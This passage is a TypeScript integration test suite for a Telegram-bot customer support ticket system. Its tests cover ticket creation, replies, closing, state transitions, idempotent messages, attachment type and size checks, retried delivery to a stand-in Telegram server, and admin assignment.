import { randomUUID } from 'node:crypto';
import { createServer, type IncomingMessage, type Server, type ServerResponse } from 'node:http';
import { sql } from 'drizzle-orm';
import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import {
  API_PREFIX,
  AUTH_ROUTES,
  SESSION_COOKIE_NAME,
  TICKET_ROUTES,
  TICKET_ATTACHMENT_MAX_BYTES,
  TICKET_MESSAGES_MAX_PER_TICKET,
  isNexaError,
  money,
  type PaymentGatewayConfig,
  type ActorContext,
  type BotInstanceId,
  type CorrelationId,
  type UserId,
} from '@nexa/contracts';
import { CATALOGUE_FA } from '@nexa/i18n';
import { TicketsController } from '../../apps/api/src/surfaces/web/tickets.controller';
import { RECEIPT_CAPTURE_LOCK_CLASS } from '../../apps/api/src/modules/commerce/payments/infrastructure/drizzle-receipt.repository';
import { createApiApp, type ApiApp } from '../../apps/api/src/bootstrap';
import { seed } from '../../apps/api/src/infrastructure/persistence/seed';
import {
  adminActorFor,
  createAdmin,
  createTestContext,
  migrateOnce,
  resetDatabase,
  SEED_IDS,
  testConfig,
  tenantA,
  tenantB,
  type SeededAdmin,
  type TestContext,
} from './harness';

/**
 * WP-A7 — the support ticket system, end to end against a real PostgreSQL: the real bot
 * runtime driven by Telegram updates, the real customer notification dispatcher and outbox
 * relay against a socket standing in for Telegram, and the Web Admin's controller.
 *
 * Each rule the brief names is a case: the Telegram create / reply / close flow, the state
 * machine and its illegal edges, idempotent message creation from both sides, tenant
 * isolation, the five permissions, attachment refusal, and that a failed delivery keeps the
 * message and is retried by the lane — the acceptance: a customer has a complete support
 * conversation without losing history when Telegram delivery temporarily fails.
 */

type FastifyRequest = Parameters<TicketsController['list']>[0];
type FastifyReply = Parameters<TicketsController['attachment']>[1];

const BOT_A = SEED_IDS.botA1 as BotInstanceId;
const BOT_B = SEED_IDS.botB1 as BotInstanceId;
// Seeded STOPPED; the one test that needs a second bot in tenant A starts it.
const BOT_A2 = SEED_IDS.botA2 as BotInstanceId;
const CUSTOMER_TG = '951001';
const OTHER_TG = '951002';
const FOREIGN_TG = '951003';
const ADMIN_TG = '951900';

const systemActor = (correlationId: string): ActorContext => ({
  type: 'SYSTEM_JOB',
  id: null,
  label: 'telegram-update:test',
  surface: 'TELEGRAM',
  correlationId: correlationId as CorrelationId,
});

/** Every route condition off and both purposes on, as the route suites build it. */
const OPEN_ROUTE: PaymentGatewayConfig = {
  displayName: null,
  instructions: null,
  minAmountMinor: 0n,
  maxAmountMinor: 0n,
  eligibility: {
    activateAfterPayments: 0,
    deactivateAfterPayments: 0,
    activateAfterAccountDays: 0,
  },
  sortOrder: 0,
  topupCashbackPercent: 0,
  allowServicePurchase: true,
  allowWalletTopup: true,
};

interface Sent {
  readonly url: string;
  readonly body: Record<string, unknown>;
  /** The request's bytes as sent: a multipart upload's file is compared against these. */
  readonly raw: Buffer;
}

/** How the stand-in answers the next customer sends: normally, refused, rate-limited or 5xx. */
type Mode = 'OK' | 'REFUSE' | 'RATE_LIMIT' | 'SERVER_ERROR';

describe('WP-A7 — support tickets', () => {
  let ctx: TestContext;
  let telegram: Server;
  let sent: Sent[];
  let mode: Mode = 'OK';
  /** HF-A7: how the stand-in answers a `sendPhoto` / `sendDocument` upload, apart from text. */
  let fileMode: Mode = 'OK';
  let uploadSeq = 0;
  let customer: UserId;
  let other: UserId;
  let owner: SeededAdmin;
  let updateSeq = 1000;

  beforeAll(async () => {
    telegram = createServer((request: IncomingMessage, response: ServerResponse) => {
      const chunks: Buffer[] = [];
      request.on('data', (chunk: Buffer) => chunks.push(chunk));
      request.on('end', () => {
        const url = request.url ?? '';
        // The file download half of `getFile`: the bytes of the one attachment asked for.
        if (url.includes('/file/bot')) {
          response.writeHead(200, { 'content-type': 'application/pdf' });
          response.end(Buffer.from('%PDF-1.4 ticket'));
          return;
        }
        const bytes = Buffer.concat(chunks);
        const raw = bytes.toString('utf8');
        let body: Record<string, unknown>;
        try {
          body = JSON.parse(raw) as Record<string, unknown>;
        } catch {
          body = { unparseable: raw };
        }
        sent.push({ url, body, raw: bytes });
        if (url.endsWith('/getFile')) {
          response.writeHead(200, { 'content-type': 'application/json' });
          response.end(
            JSON.stringify({
              ok: true,
              result: { file_path: 'documents/file_1.pdf', file_size: 15 },
            }),
          );
          return;
        }
        const upload = url.endsWith('/sendPhoto') || url.endsWith('/sendDocument');
        // HF-A7: an accepted upload answers with the file as Telegram now holds it.
        if (upload && fileMode === 'OK') {
          uploadSeq += 1;
          const file = {
            file_id: `sent-file-${String(uploadSeq)}`,
            file_unique_id: `u-sent-file-${String(uploadSeq)}`,
          };
          response.writeHead(200, { 'content-type': 'application/json' });
          response.end(
            JSON.stringify({
              ok: true,
              result: url.endsWith('/sendPhoto')
                ? { message_id: 12, photo: [{ file_id: 'thumb', file_unique_id: 'u-thumb' }, file] }
                : { message_id: 12, document: file },
            }),
          );
          return;
        }
        const failing = upload ? fileMode : url.endsWith('/sendMessage') ? mode : 'OK';
        if (failing !== 'OK') {
          if (failing === 'REFUSE') {
            response.writeHead(400, { 'content-type': 'application/json' });
            response.end(
              JSON.stringify({ ok: false, error_code: 400, description: 'Bad Request' }),
            );
          } else if (failing === 'RATE_LIMIT') {
            response.writeHead(429, { 'content-type': 'application/json' });
            response.end(
              JSON.stringify({ ok: false, error_code: 429, parameters: { retry_after: 1 } }),
            );
          } else {
            response.writeHead(502, { 'content-type': 'application/json' });
            response.end(JSON.stringify({ ok: false, error_code: 502 }));
          }
          return;
        }
        response.writeHead(200, { 'content-type': 'application/json' });
        response.end(JSON.stringify({ ok: true, result: { message_id: 11 } }));
      });
    });
    await new Promise<void>((resolve) => telegram.listen(0, '127.0.0.1', resolve));
    const address = telegram.address();
    if (address === null || typeof address === 'string') throw new Error('no address');
    ctx = await createTestContext({
      TELEGRAM_API_BASE_URL: `http://127.0.0.1:${String(address.port)}`,
    });
  }, 120_000);

  afterAll(async () => {
    await ctx?.close();
    telegram.closeAllConnections();
    await new Promise<void>((resolve) => telegram.close(() => resolve()));
  });

  beforeEach(async () => {
    await ctx.reset();
    ctx.container.setInstallationTenant(tenantA.tenantId);
    sent = [];
    mode = 'OK';
    fileMode = 'OK';
    // Each test's first accepted upload is `sent-file-1`, whatever ran before it.
    uploadSeq = 0;
    owner = await createAdmin(ctx.container, tenantA, {
      username: 'owner-tickets',
      roleKeys: ['owner'],
    });
    customer = await resolve(CUSTOMER_TG, 'مریم');
    other = await resolve(OTHER_TG, 'علی');
    await resolve(FOREIGN_TG, 'بیگانه', true);
  });

  async function resolve(telegramUserId: string, firstName: string, inTenantB = false) {
    const resolved = await ctx.container.customers.resolveFromUpdate(
      inTenantB ? tenantB : tenantA,
      systemActor(`r-${telegramUserId}`),
      {
        idempotencyKey: `resolve-ticket-${telegramUserId}`,
        telegramUserId,
        from: { id: Number(telegramUserId), first_name: firstName },
        botInstanceId: inTenantB ? BOT_B : BOT_A,
      },
    );
    return resolved.customer.id;
  }

  // --- driving the bot -------------------------------------------------------------------

  const envelope = (telegramUserId: string, update: Record<string, unknown>) => {
    updateSeq += 1;
    return {
      idempotencyKey: `ticket-update-${String(updateSeq)}-${randomUUID()}`,
      botInstanceId: BOT_A,
      telegramUserId,
      from: { id: Number(telegramUserId), first_name: 'مریم' },
      update: { update_id: updateSeq, ...update },
    };
  };
  const tap = (data: string, telegramUserId = CUSTOMER_TG) =>
    envelope(telegramUserId, {
      callback_query: {
        id: `cbq-${String(updateSeq + 1)}`,
        from: { id: Number(telegramUserId), is_bot: false, first_name: 'مریم' },
        data,
        message: {
          message_id: updateSeq + 1,
          date: 0,
          chat: { id: Number(telegramUserId), type: 'private' },
        },
      },
    });
  const text = (value: string, telegramUserId = CUSTOMER_TG) =>
    envelope(telegramUserId, {
      message: {
        message_id: updateSeq + 1,
        date: 0,
        text: value,
        chat: { id: Number(telegramUserId), type: 'private' },
        from: { id: Number(telegramUserId), is_bot: false, first_name: 'مریم' },
      },
    });
  const documentMessage = (
    fields: { fileName: string; mimeType: string; fileSize: number; caption?: string },
    telegramUserId = CUSTOMER_TG,
  ) =>
    envelope(telegramUserId, {
      message: {
        message_id: updateSeq + 1,
        date: 0,
        chat: { id: Number(telegramUserId), type: 'private' },
        from: { id: Number(telegramUserId), is_bot: false, first_name: 'مریم' },
        ...(fields.caption === undefined ? {} : { caption: fields.caption }),
        document: {
          file_id: `doc-${String(updateSeq)}`,
          file_unique_id: `udoc-${String(updateSeq)}`,
          file_name: fields.fileName,
          mime_type: fields.mimeType,
          file_size: fields.fileSize,
        },
      },
    });
  const photoMessage = (caption: string | undefined, telegramUserId = CUSTOMER_TG) =>
    envelope(telegramUserId, {
      message: {
        message_id: updateSeq + 1,
        date: 0,
        chat: { id: Number(telegramUserId), type: 'private' },
        from: { id: Number(telegramUserId), is_bot: false, first_name: 'مریم' },
        ...(caption === undefined ? {} : { caption }),
        photo: [
          {
            file_id: `ph-s-${String(updateSeq)}`,
            file_unique_id: `uph-s`,
            width: 90,
            height: 90,
            file_size: 900,
          },
          {
            file_id: `ph-l-${String(updateSeq)}`,
            file_unique_id: `uph-l-${String(updateSeq)}`,
            width: 1280,
            height: 720,
            file_size: 90_000,
          },
        ],
      },
    });

  type Envelope = ReturnType<typeof envelope>;
  const handle = (update: Envelope) =>
    ctx.container.botRuntime.handle(tenantA, systemActor('bot'), update);

  const messages = () => sent.filter((one) => one.url.endsWith('/sendMessage'));
  const lastSent = () => messages().at(-1)?.body ?? {};
  const lastText = () => String(lastSent().text ?? '');
  const callbacksOf = (body: Record<string, unknown>): string[] => {
    const markup = body.reply_markup as { inline_keyboard?: { callback_data?: string }[][] };
    return (markup?.inline_keyboard ?? []).flat().map((button) => button.callback_data ?? '');
  };

  async function rows<T>(query: ReturnType<typeof sql>): Promise<T[]> {
    return ((await ctx.container.database.db.execute(query as never)) as unknown as { rows: T[] })
      .rows;
  }
  const count = async (query: ReturnType<typeof sql>) =>
    Number((await rows<{ n: number }>(query))[0]?.n ?? 0);

  async function refusalOf(promise: Promise<unknown>): Promise<{ code: string; kind: string }> {
    try {
      await promise;
    } catch (error) {
      if (isNexaError(error)) return { code: error.code, kind: error.kind };
      throw error;
    }
    throw new Error('expected a refusal');
  }

  /** Opens a ticket through the bot: list, new, category, message. Returns its id. */
  async function openThroughBot(body: string, telegramUserId = CUSTOMER_TG): Promise<string> {
    await handle(tap('tkn:', telegramUserId));
    const category = callbacksOf(lastSent()).find((data) => data.startsWith('tkc:'));
    if (category === undefined) throw new Error(`no category button: ${lastText()}`);
    await handle(tap(category, telegramUserId));
    await handle(text(body, telegramUserId));
    const view = callbacksOf(lastSent()).find((data) => data.startsWith('tkv:'));
    if (view === undefined) throw new Error(`no ticket was opened: ${lastText()}`);
    return view.slice('tkv:'.length);
  }

  async function webAs(admin: SeededAdmin): Promise<{
    controller: TicketsController;
    request: FastifyRequest;
  }> {
    const { token } = await ctx.container.auth.login(
      tenantA,
      { type: 'API', id: null, label: null, surface: 'WEB', correlationId: 'a7' as CorrelationId },
      { username: admin.username, password: admin.password },
      { ip: '203.0.113.7', userAgent: 'vitest' },
    );
    return {
      controller: new TicketsController(ctx.container),
      request: {
        headers: { cookie: `${SESSION_COOKIE_NAME}=${token}` },
        ip: '203.0.113.7',
        method: 'POST',
      } as unknown as FastifyRequest,
    };
  }

  const deliver = async () => {
    // Every queued reply is due now: time passing, without a clock to move.
    await ctx.container.database.db.execute(
      sql`UPDATE customer_notifications SET next_attempt_at = now() - interval '1 second'
           WHERE state = 'PENDING'`,
    );
    await ctx.container.customerNotificationLoop.tick();
  };

  // ===========================================================================
  // The customer's Telegram flow
  // ===========================================================================

  it('opens a ticket from the menu: list, the seeded categories, the prompt, the message', async () => {
    const empty = await handle(text(CATALOGUE_FA['bot.menu.tickets']));
    expect(empty.intent).toBe('TICKETS');
    expect(empty.replyKey).toBe('bot.ticket.list_empty');
    expect(callbacksOf(lastSent())).toContain('tkn:');

    const chooser = await handle(tap('tkn:'));
    expect(chooser.replyKey).toBe('bot.ticket.choose_category');
    const keyboard = JSON.stringify(lastSent().reply_markup);
    for (const title of ['مشکل اتصال', 'خرید و پرداخت', 'سرویس', 'حساب کاربری', 'سایر']) {
      expect(keyboard).toContain(title);
    }

    const category = callbacksOf(lastSent()).find((data) => data.startsWith('tkc:'))!;
    const prompt = await handle(tap(category));
    expect(prompt.replyKey).toBe('bot.ticket.message_prompt');
    // Nothing is written by the prompt: no ticket until the message is read.
    expect(await count(sql`SELECT count(*)::int AS n FROM tickets`)).toBe(0);

    const created = await handle(text('سرویس من از دیروز وصل نمی‌شود.\nلطفاً بررسی کنید.'));
    expect(created.replyKey).toBe('bot.ticket.created');
    const [ticket] = await rows<{
      id: string;
      status: string;
      subject: string;
      category_title: string;
    }>(sql`SELECT id, status, subject, category_title FROM tickets`);
    expect(ticket).toMatchObject({
      status: 'OPEN',
      subject: 'سرویس من از دیروز وصل نمی‌شود.',
      category_title: 'مشکل اتصال',
    });
    const [message] = await rows<{ sender_type: string; body: string }>(
      sql`SELECT sender_type, body FROM ticket_messages WHERE ticket_id = ${ticket!.id}`,
    );
    expect(message).toEqual({
      sender_type: 'CUSTOMER',
      body: 'سرویس من از دیروز وصل نمی‌شود.\nلطفاً بررسی کنید.',
    });

    // The list now shows it, and the conversation opens from it.
    await handle(tap('tkl:'));
    expect(callbacksOf(lastSent())).toContain(`tkv:${ticket!.id}`);
    const view = await handle(tap(`tkv:${ticket!.id}`));
    expect(view.replyKey).toBe('bot.ticket.view');
    expect(lastText()).toContain('سرویس من از دیروز وصل نمی‌شود.');
    expect(callbacksOf(lastSent())).toEqual(
      expect.arrayContaining([`tkr:${ticket!.id}`, `tkq:${ticket!.id}`, 'tkl:']),
    );
  });

  it('writes ONE ticket for a redelivered update, and answers it the same way', async () => {
    await handle(tap('tkn:'));
    const category = callbacksOf(lastSent()).find((data) => data.startsWith('tkc:'))!;
    await handle(tap(category));
    const update = text('اتصال قطع است');
    const first = await handle(update);
    const again = await handle(update);
    expect(first.replyKey).toBe('bot.ticket.created');
    expect(again.replyKey).toBe('bot.ticket.created');
    expect(await count(sql`SELECT count(*)::int AS n FROM tickets`)).toBe(1);
    expect(await count(sql`SELECT count(*)::int AS n FROM ticket_messages`)).toBe(1);
  });

  it('replies from the bot with text and a photo, and closes: ask, then confirm', async () => {
    const ticketId = await openThroughBot('پرداخت انجام شد ولی سرویس نیامد');

    const prompt = await handle(tap(`tkr:${ticketId}`));
    expect(prompt.replyKey).toBe('bot.ticket.reply_prompt');
    const replied = await handle(text('شماره پیگیری: ۱۲۳۴'));
    expect(replied.replyKey).toBe('bot.ticket.reply_sent');

    // A photo with its caption is one message: the file's binding and the words.
    await handle(tap(`tkr:${ticketId}`));
    const photo = await handle(photoMessage('رسید بانکی'));
    expect(photo.replyKey).toBe('bot.ticket.reply_sent');
    const stored = await rows<{
      body: string | null;
      attachment_kind: string | null;
      attachment_file_id: string | null;
      attachment_bot_instance_id: string | null;
    }>(
      sql`SELECT body, attachment_kind, attachment_file_id, attachment_bot_instance_id
            FROM ticket_messages WHERE ticket_id = ${ticketId} ORDER BY seq`,
    );
    expect(stored).toHaveLength(3);
    expect(stored[2]).toMatchObject({
      body: 'رسید بانکی',
      attachment_kind: 'PHOTO',
      attachment_bot_instance_id: BOT_A,
    });
    // The LARGEST size, never the thumbnail.
    expect(stored[2]!.attachment_file_id).toMatch(/^ph-l-/);
    // A customer's reply before support answered leaves the ticket OPEN.
    expect(
      (await rows<{ status: string }>(sql`SELECT status FROM tickets WHERE id = ${ticketId}`))[0],
    ).toEqual({ status: 'OPEN' });

    const ask = await handle(tap(`tkq:${ticketId}`));
    expect(ask.replyKey).toBe('bot.ticket.close_ask');
    expect(callbacksOf(lastSent())).toContain(`tkx:${ticketId}`);
    // The question writes nothing.
    expect(
      (await rows<{ status: string }>(sql`SELECT status FROM tickets WHERE id = ${ticketId}`))[0],
    ).toEqual({ status: 'OPEN' });

    const closed = await handle(tap(`tkx:${ticketId}`));
    expect(closed.replyKey).toBe('bot.ticket.closed');
    const [row] = await rows<{ status: string; closed_at: Date | null }>(
      sql`SELECT status, closed_at FROM tickets WHERE id = ${ticketId}`,
    );
    expect(row!.status).toBe('CLOSED');
    expect(row!.closed_at).not.toBeNull();
    expect(
      await rows<{ system_event: string }>(
        sql`SELECT system_event FROM ticket_messages WHERE ticket_id = ${ticketId} AND sender_type = 'SYSTEM'`,
      ),
    ).toEqual([{ system_event: 'CLOSED_BY_CUSTOMER' }]);

    // A closed ticket offers no reply, and refuses one that arrives anyway.
    const again = await handle(tap(`tkr:${ticketId}`));
    expect(again.replyKey).toBe('bot.ticket.already_closed');
    expect(
      await refusalOf(
        ctx.container.tickets.replyByCustomer(tenantA, systemActor('late'), {
          customerId: customer,
          botInstanceId: BOT_A,
          ticketId,
          text: 'دیر',
          file: null,
          idempotencyKey: 'late-reply',
        }),
      ),
    ).toMatchObject({ code: 'ticket.closed' });
  });

  it('refuses a dangerous or oversized file, writes nothing, and keeps the window open', async () => {
    const ticketId = await openThroughBot('فایل پیوست می‌کنم');
    const before = await count(sql`SELECT count(*)::int AS n FROM ticket_messages`);

    await handle(tap(`tkr:${ticketId}`));
    const exe = await handle(
      documentMessage({
        fileName: 'setup.exe',
        mimeType: 'application/x-msdownload',
        fileSize: 1000,
      }),
    );
    expect(exe.replyKey).toBe('bot.ticket.attachment_type_refused');
    // A renamed executable: the MIME type claims PDF, the extension does not agree.
    const renamed = await handle(
      documentMessage({ fileName: 'invoice.pdf.exe', mimeType: 'application/pdf', fileSize: 1000 }),
    );
    expect(renamed.replyKey).toBe('bot.ticket.attachment_type_refused');
    const html = await handle(
      documentMessage({ fileName: 'page.html', mimeType: 'text/html', fileSize: 1000 }),
    );
    expect(html.replyKey).toBe('bot.ticket.attachment_type_refused');
    const large = await handle(
      documentMessage({
        fileName: 'big.pdf',
        mimeType: 'application/pdf',
        fileSize: TICKET_ATTACHMENT_MAX_BYTES + 1,
      }),
    );
    expect(large.replyKey).toBe('bot.ticket.attachment_too_large');
    expect(await count(sql`SELECT count(*)::int AS n FROM ticket_messages`)).toBe(before);

    // Still open: an allowed PDF is accepted on the next try.
    const pdf = await handle(
      documentMessage({ fileName: 'Invoice.PDF', mimeType: 'application/pdf', fileSize: 2048 }),
    );
    expect(pdf.replyKey).toBe('bot.ticket.reply_sent');
    const [attached] = await rows<{ attachment_kind: string; attachment_mime_type: string }>(
      sql`SELECT attachment_kind, attachment_mime_type FROM ticket_messages
           WHERE ticket_id = ${ticketId} AND attachment_kind IS NOT NULL`,
    );
    expect(attached).toEqual({
      attachment_kind: 'DOCUMENT',
      attachment_mime_type: 'application/pdf',
    });
  });

  it('refuses the same rule at the service, whichever surface calls it', async () => {
    await ctx.container.ticketCategories.ensureSeeded(tenantA);
    const [category] = await ctx.container.ticketCategories.activeForCustomer(tenantA);
    const refused = await refusalOf(
      ctx.container.tickets.openByCustomer(tenantA, systemActor('svc'), {
        customerId: customer,
        botInstanceId: BOT_A,
        categoryId: category!.id,
        text: null,
        file: {
          kind: 'DOCUMENT',
          fileId: 'f',
          fileUniqueId: 'uf',
          mimeType: 'application/zip',
          fileName: 'x.zip',
          fileSize: 10n,
        },
        idempotencyKey: 'svc-zip',
      }),
    );
    expect(refused.code).toBe('ticket.attachment_refused');
    const empty = await refusalOf(
      ctx.container.tickets.openByCustomer(tenantA, systemActor('svc'), {
        customerId: customer,
        botInstanceId: BOT_A,
        categoryId: category!.id,
        text: '   ',
        file: null,
        idempotencyKey: 'svc-empty',
      }),
    );
    expect(empty.code).toBe('ticket.message_invalid');
    expect(await count(sql`SELECT count(*)::int AS n FROM tickets`)).toBe(0);
  });

  it('holds a customer to five open tickets', async () => {
    await ctx.container.ticketCategories.ensureSeeded(tenantA);
    const [category] = await ctx.container.ticketCategories.activeForCustomer(tenantA);
    const open = (key: string) =>
      ctx.container.tickets.openByCustomer(tenantA, systemActor(key), {
        customerId: customer,
        botInstanceId: BOT_A,
        categoryId: category!.id,
        text: `تیکت ${key}`,
        file: null,
        idempotencyKey: key,
      });
    for (const key of ['a1', 'a2', 'a3', 'a4', 'a5']) await open(key);
    expect((await refusalOf(open('a6'))).code).toBe('ticket.open_limit');
    const menu = await handle(tap('tkn:'));
    expect(menu.replyKey).toBe('bot.ticket.open_limit');
  });

  // ===========================================================================
  // Support's reply, and its delivery
  // ===========================================================================

  it('delivers support’s reply through the lane, read from the message row, with its buttons', async () => {
    const ticketId = await openThroughBot('کمک لازم دارم');
    const web = await webAs(owner);
    const reply = await web.controller.reply(web.request, ticketId, {
      idempotencyKey: 'reply-key-0001',
      text: 'سلام، لطفاً اپلیکیشن را به‌روزرسانی کنید.',
    });
    expect(reply.ticket.status).toBe('WAITING_FOR_CUSTOMER');
    expect(reply.message).toMatchObject({ senderType: 'ADMIN', delivery: 'PENDING' });

    // The lane row names the MESSAGE and carries no text.
    const [queued] = await rows<{ kind: string; subject_id: string; state: string }>(
      sql`SELECT kind, subject_id, state FROM customer_notifications WHERE kind = 'TICKET_REPLY'`,
    );
    expect(queued).toEqual({
      kind: 'TICKET_REPLY',
      subject_id: reply.message.id,
      state: 'PENDING',
    });

    sent = [];
    await deliver();
    const toCustomer = messages().filter((one) => String(one.body.chat_id) === CUSTOMER_TG);
    expect(toCustomer).toHaveLength(1);
    const body = toCustomer[0]!.body;
    expect(String(body.text)).toContain('سلام، لطفاً اپلیکیشن را به‌روزرسانی کنید.');
    expect(callbacksOf(body)).toEqual([`tkr:${ticketId}`, `tkv:${ticketId}`]);

    const detail = await web.controller.detail(web.request, ticketId);
    expect(detail.messages.map((one) => [one.senderType, one.delivery])).toEqual([
      ['CUSTOMER', null],
      ['ADMIN', 'DELIVERED'],
    ]);

    // The customer answers: the ticket is back with support.
    await handle(tap(`tkr:${ticketId}`));
    await handle(text('به‌روزرسانی کردم، درست شد.'));
    expect((await web.controller.detail(web.request, ticketId)).ticket.status).toBe(
      'WAITING_FOR_SUPPORT',
    );
  });

  it('keeps the reply and retries it when Telegram refuses or rate-limits, and never re-sends an unknown one', async () => {
    const ticketId = await openThroughBot('پیام آزمایشی');
    const web = await webAs(owner);

    // A definite refusal: one attempt spent, still PENDING, the message in the ticket.
    mode = 'REFUSE';
    const refused = await web.controller.reply(web.request, ticketId, {
      idempotencyKey: 'reply-refused-1',
      text: 'پاسخ اول',
    });
    await deliver();
    expect(
      await rows<{ state: string; attempts: number }>(
        sql`SELECT state, attempts FROM customer_notifications WHERE subject_id = ${refused.message.id}`,
      ),
    ).toEqual([{ state: 'PENDING', attempts: 1 }]);

    // A rate limit: no attempt spent.
    mode = 'RATE_LIMIT';
    await deliver();
    expect(
      await rows<{ state: string; attempts: number }>(
        sql`SELECT state, attempts FROM customer_notifications WHERE subject_id = ${refused.message.id}`,
      ),
    ).toEqual([{ state: 'PENDING', attempts: 1 }]);

    // Telegram recovers: the same reply arrives, once.
    mode = 'OK';
    sent = [];
    await deliver();
    expect(messages().filter((one) => String(one.body.text).includes('پاسخ اول'))).toHaveLength(1);
    expect((await web.controller.detail(web.request, ticketId)).messages.at(-1)?.delivery).toBe(
      'DELIVERED',
    );

    // An unknown outcome is UNCONFIRMED and never retried — and the reply is still there.
    mode = 'SERVER_ERROR';
    const unknown = await web.controller.reply(web.request, ticketId, {
      idempotencyKey: 'reply-unknown-1',
      text: 'پاسخ دوم',
    });
    await deliver();
    mode = 'OK';
    sent = [];
    await deliver();
    expect(messages()).toHaveLength(0);
    const detail = await web.controller.detail(web.request, ticketId);
    expect(detail.messages.find((one) => one.id === unknown.message.id)).toMatchObject({
      body: 'پاسخ دوم',
      delivery: 'UNCONFIRMED',
    });
    // The customer reads both replies in the ticket whatever the lane did.
    await handle(tap(`tkv:${ticketId}`));
    expect(lastText()).toContain('پاسخ اول');
    expect(lastText()).toContain('پاسخ دوم');
  });

  it('writes one reply per key, and refuses the key reused with other words', async () => {
    const ticketId = await openThroughBot('کلید تکراری');
    const web = await webAs(owner);
    const first = await web.controller.reply(web.request, ticketId, {
      idempotencyKey: 'same-key-0001',
      text: 'یک بار',
    });
    const again = await web.controller.reply(web.request, ticketId, {
      idempotencyKey: 'same-key-0001',
      text: 'یک بار',
    });
    expect(again.message.id).toBe(first.message.id);
    expect(
      await count(
        sql`SELECT count(*)::int AS n FROM ticket_messages WHERE ticket_id = ${ticketId} AND sender_type = 'ADMIN'`,
      ),
    ).toBe(1);
    expect(
      await count(
        sql`SELECT count(*)::int AS n FROM customer_notifications WHERE kind = 'TICKET_REPLY'`,
      ),
    ).toBe(1);
    const reused = await refusalOf(
      web.controller.reply(web.request, ticketId, {
        idempotencyKey: 'same-key-0001',
        text: 'متن دیگر',
      }),
    );
    expect(reused.code).toBe('platform.idempotency_payload_mismatch');
  });

  // ===========================================================================
  // The state machine
  // ===========================================================================

  it('moves only along the machine’s edges, with a system fact for close and reopen', async () => {
    const ticketId = await openThroughBot('وضعیت');
    const actor = adminActorFor(owner);
    const status = (to: 'OPEN' | 'WAITING_FOR_CUSTOMER' | 'WAITING_FOR_SUPPORT' | 'CLOSED') =>
      ctx.container.tickets.setStatus(tenantA, actor, { ticketId, status: to });

    // The status it already has is no change.
    expect(await status('OPEN')).toMatchObject({ changed: false });
    expect((await status('WAITING_FOR_SUPPORT')).ticket.status).toBe('WAITING_FOR_SUPPORT');
    // No edge leads back to OPEN.
    expect((await refusalOf(status('OPEN'))).code).toBe('ticket.transition_invalid');
    expect((await status('CLOSED')).ticket.status).toBe('CLOSED');
    // From CLOSED there is one way out, and it is a reopen that waits for support.
    expect((await refusalOf(status('WAITING_FOR_CUSTOMER'))).code).toBe(
      'ticket.transition_invalid',
    );
    // And support cannot write into a closed ticket.
    expect(
      (
        await refusalOf(
          ctx.container.tickets.reply(tenantA, actor, {
            ticketId,
            text: 'در تیکت بسته',
            idempotencyKey: 'closed-reply-1',
          }),
        )
      ).code,
    ).toBe('ticket.closed');
    expect((await status('WAITING_FOR_SUPPORT')).ticket).toMatchObject({
      status: 'WAITING_FOR_SUPPORT',
      closedAt: null,
    });
    expect(
      await rows<{ system_event: string }>(
        sql`SELECT system_event FROM ticket_messages WHERE ticket_id = ${ticketId} AND sender_type = 'SYSTEM' ORDER BY seq`,
      ),
    ).toEqual([{ system_event: 'CLOSED_BY_SUPPORT' }, { system_event: 'REOPENED_BY_SUPPORT' }]);

    // Every change is audited, with no reason asked.
    const audits = await rows<{ action: string; before: unknown; after: unknown }>(
      sql`SELECT action, before, after FROM audit_logs
           WHERE entity_id = ${ticketId} AND action = 'ticket.status' ORDER BY occurred_at, id`,
    );
    expect(audits.map((one) => [one.before, one.after])).toEqual([
      [{ status: 'OPEN' }, { status: 'WAITING_FOR_SUPPORT' }],
      [{ status: 'WAITING_FOR_SUPPORT' }, { status: 'CLOSED' }],
      [{ status: 'CLOSED' }, { status: 'WAITING_FOR_SUPPORT' }],
    ]);
  });

  it('refuses a message edit or delete at the database', async () => {
    const ticketId = await openThroughBot('غیرقابل تغییر');
    await expect(
      ctx.container.database.db.execute(
        sql`UPDATE ticket_messages SET body = 'تغییر' WHERE ticket_id = ${ticketId}`,
      ),
    ).rejects.toThrow();
    await expect(
      ctx.container.database.db.execute(
        sql`DELETE FROM ticket_messages WHERE ticket_id = ${ticketId}`,
      ),
    ).rejects.toThrow();
  });

  // ===========================================================================
  // Assignment, priority, links, categories
  // ===========================================================================

  it('assigns to self or another who may read tickets, sets priority and links the customer’s own context', async () => {
    const ticketId = await openThroughBot('ارجاع');
    const support = await createAdmin(ctx.container, tenantA, {
      username: 'support-agent',
      roleKeys: ['support'],
    });
    const sales = await createAdmin(ctx.container, tenantA, {
      username: 'sales-agent',
      roleKeys: ['sales'],
    });
    const web = await webAs(owner);

    const mine = await web.controller.assign(web.request, ticketId, { adminId: owner.id });
    expect(mine).toMatchObject({
      changed: true,
      ticket: { assignedAdminUsername: 'owner-tickets' },
    });
    const theirs = await web.controller.assign(web.request, ticketId, { adminId: support.id });
    expect(theirs.ticket.assignedAdminId).toBe(support.id);
    // Somebody who may not read tickets cannot be given one.
    expect(
      (await refusalOf(web.controller.assign(web.request, ticketId, { adminId: sales.id }))).code,
    ).toBe('ticket.assignee_invalid');
    const assignees = await web.controller.assignees(web.request);
    expect(assignees.admins.map((admin) => admin.username).sort()).toEqual([
      'owner-tickets',
      'support-agent',
    ]);

    expect(
      (await web.controller.priority(web.request, ticketId, { priority: 'URGENT' })).ticket
        .priority,
    ).toBe('URGENT');

    // Another customer's payment is not this ticket's context; the customer's own is.
    await ctx.container.paymentGateways.configure(tenantA, adminActorFor(owner), {
      idempotencyKey: 'cfg-ticket-links',
      provider: 'MANUAL_TRANSFER',
      config: OPEN_ROUTE,
    });
    const topup = (customerId: UserId, key: string) =>
      ctx.container.payments.requestWalletTopupTyped(
        { ...tenantA, botInstanceId: BOT_A },
        systemActor(key),
        customerId,
        { idempotencyKey: key, amount: money(500_000n, 'IRT'), provider: 'MANUAL_TRANSFER' },
      );
    const foreign = await topup(other, 'topup-other');
    expect(
      (
        await refusalOf(
          web.controller.links(web.request, ticketId, {
            serviceId: null,
            orderId: null,
            paymentId: foreign.payment.id,
          }),
        )
      ).code,
    ).toBe('ticket.link_invalid');
    const own = await topup(customer, 'topup-own');
    const linked = await web.controller.links(web.request, ticketId, {
      serviceId: null,
      orderId: null,
      paymentId: own.payment.id,
    });
    expect(linked).toMatchObject({ changed: true, ticket: { paymentId: own.payment.id } });
    // The same links again change nothing.
    expect(
      (
        await web.controller.links(web.request, ticketId, {
          serviceId: null,
          orderId: null,
          paymentId: own.payment.id,
        })
      ).changed,
    ).toBe(false);

    // The inbox filters by assignee, status, category and customer.
